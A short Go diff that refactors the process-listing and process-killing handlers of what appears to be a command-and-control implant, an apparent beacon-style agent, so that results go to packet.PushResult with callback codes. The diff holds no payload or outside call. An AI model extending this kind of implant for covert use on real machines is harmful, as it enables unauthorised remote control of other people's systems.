@@ -33,11 +33,9 @@ func ListProcess(pendingRequest []byte) error {
 	// command line ps
 	resultBytes := append(pendingRequest, []byte(result)...)
 	if binary.BigEndian.Uint32(pendingRequest) == 0 {
-		finalPacket := packet.MakePacket(CALLBACK_PROCESS_LIST, resultBytes)
-		packet.PushResult(finalPacket)
+		packet.PushResult(CALLBACK_PROCESS_LIST, resultBytes)
 	} else {
-		finalPacket := packet.MakePacket(CALLBACK_PENDING, resultBytes)
-		packet.PushResult(finalPacket)
+		packet.PushResult(CALLBACK_PENDING, resultBytes)
 	}
 	return nil
 }
@@ -54,8 +52,7 @@ func KillProcess(b []byte) error {
 			if err != nil {
 				return err
 			}
-			finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
-			packet.PushResult(finalPacket)
+			packet.PushResult(CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
 		}
 	}
 	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
